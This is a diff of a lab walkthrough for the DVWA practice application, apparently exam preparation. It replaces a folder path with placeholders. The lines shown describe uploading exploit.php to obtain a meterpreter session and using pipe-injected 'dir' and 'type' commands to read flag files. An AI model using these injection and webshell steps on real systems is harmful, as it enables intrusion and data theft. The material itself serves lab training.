@@ -100,12 +100,12 @@ Upload a file you created as exploit.php
 Open terminal and type run once you get url type url in brower you get meterpreter session then type ls 
 get the files. 
 ```
-#### Given website and folder C:\Wamp64\www\DVWA\ECweb\Certified\” 
+#### Given website and folder C:\abc\www\DVWA\x\y\” 
 ```bash
 login to the dvwa application > set security level low > choose command execution type below commands
-| dir "C:\Wamp64\www\DVWA\ECweb\Certified"
-| type "C:\Wamp64\www\DVWA\ECweb\Certified\Flag1.txt"
-| type "C:\Wamp64\www\DVWA\ECweb\Certified\Flag2.txt"
+| dir "C:\abc\www\DVWA\x\y\"
+| type "C:\abc\www\DVWA\x\y\Flag1.txt"
+| type "C:\abc\www\DVWA\x\y\Flag2.txt"
 or
 1. Open the url given and login with given details. 
 2. After login http://172.20.0.16/DWVA/hackable/uploads/ 
